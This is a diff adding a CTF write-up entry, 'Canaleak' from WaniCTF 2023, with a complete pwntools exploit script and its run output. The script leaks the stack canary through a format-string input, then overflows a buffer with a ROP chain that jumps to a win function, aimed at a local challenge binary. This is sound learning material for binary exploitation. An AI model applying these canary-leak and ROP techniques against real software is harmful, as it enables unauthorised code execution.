@@ -435,3 +435,59 @@ io.stream()
     0x0030:         0x4013af syscall; ret
  (snip)
 ```
+
+## Canaleak
+
+- https://github.com/wani-hackase/wanictf2023-writeup/tree/main/pwn/Canaleak
+
+```python
+#!/usr/bin/env python3
+from pwn import ELF, ROP, args, context, flat, log, remote
+from pwnlib import gdb
+
+if args.DEBUG:
+    context.log_level = "debug"
+exe = context.binary = ELF("file/chall", checksec=False)
+libc = exe.libc
+if args.GDB:
+    io = gdb.debug(exe.path, gdbscript="c")
+else:
+    io = remote("127.0.0.1", 9006)
+# ------------------------------------------------------------------------
+# rbp-0x20 char format[0x18]
+# rbp-0x8  canary
+# rbp-0x0  saved rbp
+# rbp+0x8  saved rip
+io.sendlineafter(b"me? : ", b"%9$p")
+canary = int(io.recvline(drop=True), 16)
+log.info("canary: 0x%016x", canary)
+# ------------------------------------------------------------------------
+rop = ROP(exe)
+rop.raw(0x000000000040116f)  # nop; ret;
+rop.raw(exe.sym.win)
+log.info("ROP:\n%s", rop.dump())
+io.sendlineafter(b"me? : ", flat(
+    b"YES\x00",
+    b"A"*(0x18 - 4),
+    canary,
+    b"B"*0x8,
+    rop.chain()))
+# ------------------------------------------------------------------------
+io.sendlineafter(b"YES", b"cat FLAG")
+io.recvuntil(b"FLAG{")
+log.success("FLAG{%s", io.recvuntil(b"}").decode())
+io.close()
+```
+
+### Answer
+
+```zsh
+$ ./solver.py
+[+] Opening connection to 127.0.0.1 on port 9006: Done
+[*] canary: 0xc4d8c2fab7974600
+[*] Loaded 14 cached gadgets for 'file/chall'
+[*] ROP:
+    0x0000:         0x40116f
+    0x0008:         0x40123d win
+ (snip)
+```
